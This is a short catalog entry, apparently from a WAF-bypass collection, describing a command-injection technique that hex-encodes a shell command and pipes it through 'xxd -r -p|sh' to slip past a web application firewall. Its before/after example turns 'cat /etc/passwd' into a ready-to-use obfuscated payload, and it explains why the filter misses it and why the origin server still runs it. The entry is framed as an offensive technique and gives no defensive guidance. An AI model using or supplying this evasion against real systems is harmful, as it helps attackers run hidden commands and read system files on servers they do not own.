# cmdi_hex_echo

Category: cmdi | Fidelity: differential

## Mechanism

Echo <hex>|xxd -r -p|sh.

## Why the WAF misses it

The command's literal bytes vanish into a hex blob plus a decode pipe.

## Why the origin still accepts it

`xxd -r -p | sh` reconstructs the original command and executes it.

## Prerequisites and limits

`xxd` + `sh` available on the target.

## References

- https://hacktricks.wiki/en/pentesting-web/command-injection
- https://github.com/Ilias1988/waf-bypass

## Before / After

```
cat /etc/passwd
-->
echo 636174202f6574632f706173737764|xxd -r -p|sh
```

## Measured result

Not yet measured.
